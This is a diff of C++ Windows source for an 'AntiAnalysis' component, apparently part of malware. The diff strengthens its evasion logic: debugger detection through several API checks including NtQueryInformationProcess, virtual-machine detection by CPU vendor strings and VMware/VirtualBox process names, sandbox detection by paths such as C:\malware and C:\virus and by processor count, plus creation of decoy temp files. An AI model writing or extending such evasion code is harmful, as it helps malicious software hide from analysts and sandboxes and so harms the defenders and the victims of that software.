@@ -14,9 +14,37 @@
 #include <Windows.h>
 #include <winreg.h>
 #include <intrin.h>
-#include <excpt.h> // Add this for __try/__except
+#include <iphlpapi.h>
+#include <tlhelp32.h> // For process enumeration
 
 namespace security {
+
+// Simple process checking function since we can't rely on SystemUtils
+bool IsProcessRunning(const char* processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (!Process32First(hSnapshot, &pe32)) {
+        CloseHandle(hSnapshot);
+        return false;
+    }
+
+    bool found = false;
+    do {
+        if (_stricmp(pe32.szExeFile, processName) == 0) {
+            found = true;
+            break;
+        }
+    } while (Process32Next(hSnapshot, &pe32));
+
+    CloseHandle(hSnapshot);
+    return found;
+}
 
 bool AntiAnalysis::IsDebuggerPresent() {
     std::vector<bool(*)(void)> checks = {
@@ -26,18 +54,40 @@ bool AntiAnalysis::IsDebuggerPresent() {
             return hModule && GetProcAddress(hModule, "IsDebuggerPresent");
         },
         []() -> bool {
-            __try {
-                __asm { int 3 }
-                return false;
-            }
-            __except (EXCEPTION_EXECUTE_HANDLER) {
-                return true;
-            }
+            // Alternative to __try/__except using safe methods
+            typedef BOOL (WINAPI *CheckDebuggerPresentFunc)();
+            CheckDebuggerPresentFunc func = (CheckDebuggerPresentFunc)GetProcAddress(
+                GetModuleHandleA("kernel32.dll"), "IsDebuggerPresent");
+            return func && func();
         },
         []() -> bool {
             HANDLE hProcess = GetCurrentProcess();
             BOOL isDebugged = FALSE;
-            return CheckRemoteDebuggerPresent(hProcess, &isDebugged) && isDebugged;
+            return (CheckRemoteDebuggerPresent(hProcess, &isDebugged) && isDebugged);
+        },
+        []() -> bool {
+            // Use NtQueryInformationProcess for PEB access (safer method)
+            typedef NTSTATUS (WINAPI *NtQueryInformationProcessFunc)(
+                HANDLE, ULONG, PVOID, ULONG, PULONG);
+            
+            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+            if (!ntdll) return false;
+
+            NtQueryInformationProcessFunc NtQueryInformationProcess = 
+                (NtQueryInformationProcessFunc)GetProcAddress(ntdll, "NtQueryInformationProcess");
+            
+            if (!NtQueryInformationProcess) return false;
+
+            ULONG isDebugged = 0;
+            NTSTATUS status = NtQueryInformationProcess(
+                GetCurrentProcess(),
+                7, // ProcessDebugPort
+                &isDebugged,
+                sizeof(isDebugged),
+                NULL
+            );
+
+            return SUCCEEDED(status) && isDebugged != 0;
         }
     };
 
@@ -97,7 +147,8 @@ bool AntiAnalysis::IsRunningInVM() {
         return vendor.find("VMware") != std::string::npos ||
                vendor.find("Microsoft") != std::string::npos ||
                vendor.find("Xen") != std::string::npos ||
-               vendor.find("KVM") != std::string::npos;
+               vendor.find("KVM") != std::string::npos ||
+               vendor.find("prl hyperv") != std::string::npos; // Parallels
     }());
 
     // Check for common VM files
@@ -117,7 +168,25 @@ bool AntiAnalysis::IsRunningInVM() {
         return false;
     }());
 
-    for (const bool result : results) {
+    // Check for VM-specific processes using our local function
+    results.push_back([]() -> bool {
+        const char* vmProcesses[] = {
+            "vmtoolsd.exe",
+            "vmwaretray.exe",
+            "vmwareuser.exe",
+            "vboxservice.exe",
+            "vboxtray.exe"
+        };
+
+        for (const auto& process : vmProcesses) {
+            if (IsProcessRunning(process)) {
+                return true;
+            }
+        }
+        return false;
+    }());
+
+    for (bool result : results) {
         if (result) {
             return true;
         }
@@ -148,7 +217,8 @@ bool AntiAnalysis::IsSandboxed() {
             "C:\\analysis",
             "C:\\sandbox", 
             "C:\\malware",
-            "C:\\sample"
+            "C:\\sample",
+            "C:\\virus"
         };
 
         for (const auto& path : sandboxPaths) {
@@ -157,6 +227,13 @@ bool AntiAnalysis::IsSandboxed() {
             }
         }
         return false;
+    }());
+
+    // Check number of processors
+    results.push_back([]() -> bool {
+        SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
+        return sysInfo.dwNumberOfProcessors < 2; // Less than 2 processors
     }());
 
     for (bool result : results) {
@@ -222,7 +299,7 @@ void AntiAnalysis::ExecuteDecoyOperations() {
 void AntiAnalysis::CreateDecoyArtifacts() {
     // Create benign-looking files
     std::string tempPath = utils::FileUtils::GetTempPath();
-    std::string decoyFile = tempPath + "\\system_cache.tmp"; // Added backslash
+    std::string decoyFile = tempPath + "\\system_cache.tmp";
 
     std::ofstream file(decoyFile);
     if (file.is_open()) {
